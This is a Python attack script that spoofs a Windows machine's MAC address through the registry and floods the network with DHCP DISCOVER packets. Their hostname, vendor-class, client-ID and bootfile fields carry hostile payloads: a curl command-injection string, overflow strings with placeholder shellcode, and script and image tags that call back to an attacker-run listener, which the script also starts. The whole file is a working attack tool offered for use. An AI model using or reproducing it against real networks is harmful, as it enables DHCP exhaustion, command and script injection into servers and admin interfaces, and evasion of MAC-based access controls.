import threading
import socket
import random
import time
import subprocess
import winreg
import psutil
from scapy.all import *

# === TCP Listener ===
def start_listener(host="0.0.0.0", port=9999):
    def handler():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            s.listen()
            print(f"[+] Listening on {host}:{port} for callback connections...")
            while True:
                conn, addr = s.accept()
                print(f"[!] Callback received from {addr}")
                conn.close()
    thread = threading.Thread(target=handler, daemon=True)
    thread.start()

# === MAC Generator ===
def generate_mac():
    return "13:37:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

# === Registry Spoofing ===
def spoof_mac(adapter_name, new_mac):
    reg_path = r"SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
    for i in range(0, 1000):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"{reg_path}\\{i:04}", 0, winreg.KEY_ALL_ACCESS)
            name, _ = winreg.QueryValueEx(key, "DriverDesc")
            if adapter_name.lower() in name.lower():
                winreg.SetValueEx(key, "NetworkAddress", 0, winreg.REG_SZ, new_mac.replace(":", ""))
                winreg.CloseKey(key)
                print(f"[+] Spoofed MAC to {new_mac}")
                return True
        except Exception:
            continue
    print("[-] Adapter not found or spoofing failed.")
    return False

def restart_adapter(adapter_name):
    print(f"[~] Restarting adapter: {adapter_name}")
    subprocess.run(f'netsh interface set interface name="{adapter_name}" admin=disable', shell=True)
    time.sleep(2)
    subprocess.run(f'netsh interface set interface name="{adapter_name}" admin=enable', shell=True)
    time.sleep(2)
    print("[+] Adapter restarted.")

# === Interface Detection ===
def get_wifi_interface():
    for iface in psutil.net_if_addrs():
        if "wi-fi" in iface.lower() or "wireless" in iface.lower():
            return iface
    return None

# === Payload Generator ===
def generate_payloads(callback_ip, callback_port):
    base = f"curl {callback_ip}:{callback_port}"
    return [
        base,
        "A" * 255,
        "B" * 512,
        "C" * 1024,
        "pattern1234567890" * 20,
        "\x90" * 100 + "SHELLCODE" + "\x90" * 100,
        "\x00" * 128,
        "🔥" * 50,
        f"<script src='http://{callback_ip}:{callback_port}/x.js'></script>",
        f"<img src='http://{callback_ip}:{callback_port}/img.png'>",
    ]

def safe(payload):
    return payload[:255] if isinstance(payload, str) else payload

# === DHCP Packet Builder ===
def build_dhcp_discover(mac, payload):
    xid = random.randint(1, 900000000)
    sname = (payload[:64] if len(payload) > 64 else payload).ljust(64, "X")
    bootfile = (payload[:128] if len(payload) > 128 else payload).ljust(128, "Y")
    chaddr_raw = mac.replace(":", "").ljust(32, "Z")[:32]

    ethernet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=chaddr_raw, xid=xid, flags=0x8000, sname=sname, file=bootfile)

    dhcp = DHCP(options=[
        ("message-type", "discover"),
        ("hostname", safe(payload)),
        ("vendor_class_id", safe(payload)),
        ("client_id", safe(payload)),
        ("user_class", safe(payload)),
        ("bootfile-name", safe(payload)),
        ("param_req_list", [1, 3, 6, 15, 255]),
        ("end")
    ])

    return ethernet / ip / udp / bootp / dhcp

# === Exhaustion Loop ===
def send_exhaustion(iface, adapter_name, callback_ip, callback_port, count=30):
    payloads = generate_payloads(callback_ip, callback_port)
    for i in range(count):
        mac = generate_mac()
        payload = random.choice(payloads)
        print(f"[{i+1}] Spoofing MAC: {mac}")
        if spoof_mac(adapter_name, mac):
            restart_adapter(adapter_name)
            pkt = build_dhcp_discover(mac, payload)
            print(f"    → Sending DHCP DISCOVER with payload length {len(payload)}")
            sendp(pkt, iface=iface, verbose=0)
            time.sleep(1)
        else:
            print("    ✗ Skipped due to spoof failure")

# === Main ===
if __name__ == "__main__":
    callback_ip = "192.168.2.2"  # Replace with your listener IP
    callback_port = 4444
    adapter_name = "Wi-Fi"         # Change if needed

    iface = get_wifi_interface()
    if iface:
        start_listener(callback_ip, callback_port)
        send_exhaustion(iface, adapter_name, callback_ip, callback_port, count=30)
    else:
        print("[-] No Wi-Fi interface found.")
